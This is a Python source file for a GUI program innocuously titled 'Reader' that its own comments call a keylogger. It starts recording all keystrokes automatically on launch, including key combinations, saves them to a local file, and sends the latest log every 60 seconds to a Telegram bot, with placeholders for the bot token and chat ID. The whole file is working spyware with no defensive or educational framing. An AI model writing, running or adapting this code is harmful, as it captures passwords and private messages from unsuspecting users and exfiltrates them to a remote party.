import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import os
import requests
import time

log_file = "key_log.txt"
listener = None
is_listening = False

# === Telegram Config ===
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

# === Timer interval for sending logs ===
SEND_LOG_INTERVAL = 60  # Interval in seconds (e.g., 60 seconds = 1 minute)

# Modifier keys tracking (Shift, Ctrl, Alt, etc.)
current_keys = set()

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = str(key).replace("'", "")

        with open(log_file, "a") as f:
            f.write(f"{key_str} ")

        # Track special keys
        if key_str == "Key.ctrl_l" or key_str == "Key.ctrl_r":
            current_keys.add("Ctrl")
        elif key_str == "Key.shift_l" or key_str == "Key.shift_r":
            current_keys.add("Shift")
        elif key_str == "Key.alt_l" or key_str == "Key.alt_r":
            current_keys.add("Alt")
        elif key_str == "Key.enter":
            current_keys.add("Enter")
        elif key_str == "Key.space":
            current_keys.add("Space")
        elif key_str == "Key.backspace":
            current_keys.add("Backspace")

        # Detect key combos (e.g., Ctrl+C)
        if "Ctrl" in current_keys:
            with open(log_file, "a") as f:
                f.write(" + ".join(sorted(current_keys)) + "\n")
            current_keys.clear()

    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}] ")

def start_logging():
    global listener, is_listening
    if is_listening:
        return

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    is_listening = True
    status_label.config(text="Status: Logging started", fg="green")

def stop_logging():
    global listener, is_listening
    if listener:
        listener.stop()
        listener = None
    is_listening = False
    status_label.config(text="Status: Logging stopped", fg="red")

def open_log():
    if not os.path.exists(log_file):
        messagebox.showinfo("Log", "Log file doesn't exist yet.")
    else:
        os.system(f'notepad {log_file}')

def send_to_telegram():
    if not os.path.exists(log_file):
        messagebox.showwarning("Error", "Log file not found.")
        return

    with open(log_file, 'r') as f:
        content = f.read()

    message = f"🛡 Keylog:\n\n{content[-4000:]}"  # Telegram message limit is 4096 characters

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }

    try:
        requests.post(url, data=payload)
    except Exception as e:
        messagebox.showerror("Error", str(e))

def send_logs_periodically():
    while is_listening:
        time.sleep(SEND_LOG_INTERVAL)
        send_to_telegram()

def start_periodic_send():
    threading.Thread(target=send_logs_periodically, daemon=True).start()

# === GUI Setup ===
root = tk.Tk()
root.title("Reader")
root.geometry("300x240")
root.resizable(False, False)

tk.Label(root, text="Reader", font=("Arial", 16)).pack(pady=10)

status_label = tk.Label(root, text="Status: Logging stopped", fg="red", font=("Arial", 10))
status_label.pack(pady=5)

# Removed "Start logging" button as logging begins automatically
tk.Button(root, text="Stop Logging", command=stop_logging, width=25).pack(pady=5)
tk.Button(root, text="Open Log", command=open_log, width=25).pack(pady=5)
tk.Button(root, text="Send Log to Telegram", command=send_to_telegram, width=25).pack(pady=5)

def on_close():
    stop_logging()
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_close)

# === Start logging automatically ===
start_logging()

# === Start periodic Telegram log sending ===
start_periodic_send()

root.mainloop()


#🛠 Program: Reader GUI (Keylogger)
#Main Features:
#Automatic keylogging starts on application launch.
#
#Captures all keystrokes, including:
#
#Standard characters (a, b, 1, @, etc.)
#
#Special keys (Ctrl, Shift, Alt, Enter, Space, Backspace)
#
#Key combinations like: Ctrl + C, Ctrl + V, etc.
#
#Logs are saved to a file named key_log.txt.
#
#Log viewer button to open the log in Notepad.
#
#Automatic log sending to Telegram:
#
#Every 60 seconds (SEND_LOG_INTERVAL)
#
#Via the Telegram Bot API
#
#Sends the last 4000 characters of the log (Telegram message limit)
#
#Manual log sending to Telegram via a button.
#
#Stop logging option to disable key capture manually.
#
#Libraries Used:
#tkinter — for GUI
#
#pynput — for capturing keystrokes
#
#requests — for HTTP requests to Telegram
#
#threading / time — for background log sending
